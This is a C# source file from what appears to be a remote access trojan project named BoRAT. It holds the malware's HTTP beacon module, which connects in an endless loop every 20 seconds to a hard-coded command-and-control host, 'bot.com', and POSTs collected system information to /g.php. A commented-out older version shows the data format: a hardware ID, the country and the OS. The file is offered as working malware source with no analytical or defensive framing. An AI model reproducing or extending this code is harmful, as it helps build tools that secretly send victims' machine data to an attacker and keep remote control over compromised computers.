using BoRAT.Core.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace BoRAT.Core.Network
{
    class Http
    {
        const string host = "bot.com";

        internal static void Work()
        {
            while (true)
            {
                Request(Info.Get());
                Thread.Sleep(20 * 1000);
            }
        }

        public static void Request(string data, string url = "/g.php")
        {
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket.Connect(host, 80);

            if (socket.Connected)
            {
                try
                {
                    // Send request
                    string request = 
                        "POST " + url + " HTTP/1.1\r\n" +
                        "Host: " + host + "\r\n" +
                        "Content-Length: " + data.Length + "\r\n\r\n" + 
                        data;

                    byte[] bytes = Encoding.ASCII.GetBytes(request);
                    socket.Send(bytes, bytes.Length, SocketFlags.None);

                    Console.Write("\r\n\r\n========== Request ==========\r\n\r\n" + request);

                    // Receive response
                    byte[] rec = new byte[1024];
                    string response = null;
                    int countBytes;
                    do
                    {
                        countBytes = socket.Receive(rec, rec.Length, SocketFlags.None);
                        response += Encoding.ASCII.GetString(rec, 0, countBytes);
                    } while (countBytes <= 0);

                    socket.Close();

                    Console.Write("\r\n\r\n========== Response ==========\r\n\r\n" + response);
                }
                catch
                {
                }
            }

        }

        //public static void Request(string lol)
        //{
        //    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(host);
        //    request.Method = "POST";
        //    string requestStr = "HWID|1|barbados|Windows 7|32&1&1";
        //    request.ContentLength = requestStr.Length;
        //    Stream postStream = request.GetRequestStream();
        //    byte[] bytes = Encoding.ASCII.GetBytes(requestStr);
        //    postStream.Write(bytes, 0, bytes.Length);
        //    HttpWebResponse response = null;
        //    try
        //    {
        //        response = (HttpWebResponse)request.GetResponse();
        //    }catch(Exception ex)
        //    {
        //        Console.Write(ex.Message);
        //    }

        //    Console.Write(response.StatusCode.ToString());

        //    if (response.StatusCode == HttpStatusCode.OK)
        //    {
        //        Stream stream = response.GetResponseStream();
        //        StreamReader reader = new StreamReader(stream);
        //        Console.Write(reader.ReadToEnd());
        //        reader.Close();
        //        stream.Close();
        //    }
        //}
    }
}
